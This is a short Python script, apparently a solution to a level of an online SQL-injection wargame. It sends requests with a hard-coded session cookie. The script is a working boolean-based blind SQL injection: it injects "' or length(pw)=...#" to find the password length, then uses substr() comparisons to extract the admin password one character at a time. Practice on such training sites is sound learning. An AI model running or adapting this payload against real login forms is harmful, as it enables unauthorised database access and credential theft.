import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookie = {'PHPSESSID': 'ovbfdu14h0vaeamskdlr10nttu'}

for i in range(20):
  param = {'pw': f"' or length(pw)={i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' or substr(pw, {str(len)}, 1)='{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password)
